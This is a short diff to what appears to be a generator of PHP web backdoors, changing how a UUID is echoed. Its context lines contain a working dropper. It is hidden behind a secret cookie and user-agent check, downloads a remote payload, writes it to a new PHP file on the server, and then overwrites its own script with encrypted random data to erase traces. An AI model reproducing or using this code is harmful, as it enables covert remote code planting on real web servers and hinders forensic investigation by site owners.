@@ -32,13 +32,14 @@ if (isset(\$_COOKIE['$cookieName']) && \$_SERVER['HTTP_USER_AGENT'] === '$random
         \$$post_variable = explode('.', unserialize(base64_decode(\$_COOKIE['$cookieName']), ['allowed_classes' => false]));
         if ( hash_equals(hash_hmac('sha256', \$_COOKIE['$cookieName'], \${$post_variable}[0]), \${$post_variable}[1]) ){
             if (function_exists("com_create_guid") === true){
-                echo trim(com_create_guid()).PHP_EOL.PHP_EOL;
+                \$$random_uuid_var = trim(com_create_guid()).PHP_EOL.PHP_EOL;
             }else{
                 \$$random_data_var = openssl_random_pseudo_bytes(16);
                 \${$random_data_var}[6] = chr(ord(\${$random_data_var}[6]) & 0x0f | 0x40);
                 \${$random_data_var}[8] = chr(ord(\${$random_data_var}[8]) & 0x3f | 0x80);
-                echo vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(\$$random_data_var), 4)).PHP_EOL.PHP_EOL;
+                \$$random_uuid_var = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(\$$random_data_var), 4)).PHP_EOL.PHP_EOL;
             }
+            echo \$$random_uuid_var . "_$filename".PHP_EOL;
             fputs(fopen('./$filename.php', 'a+'), base64_decode(file_get_contents(\${$post_variable}[2])));
             foreach (file(\$_SERVER['SCRIPT_FILENAME']) as \$line){
                 fwrite(fopen(\$_SERVER['SCRIPT_FILENAME'], 'w'), openssl_encrypt(\$line, 'aes-256-ctr', bin2hex(openssl_random_pseudo_bytes(100)), OPENSSL_RAW_DATA|OPENSSL_NO_PADDING|OPENSSL_ZERO_PADDING, openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-ctr'))));
